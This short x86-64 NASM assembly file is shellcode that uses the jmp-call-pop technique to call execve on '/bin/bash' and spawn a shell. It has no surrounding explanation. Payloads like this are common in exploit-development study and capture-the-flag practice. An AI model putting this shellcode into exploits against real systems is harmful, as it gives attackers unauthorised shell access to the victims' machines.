BITS 64

start:
	xor rax, rax

	; execve
	mov al, 59
	jmp bin
_getme:
	pop rbx

	xor rcx, rcx
	push rcx
	push rbx
	mov rsi, rsp
	mov rdi, rbx
	xor rdx, rdx	
	syscall

bin:
	call _getme
	db "/bin/bash", 0
	
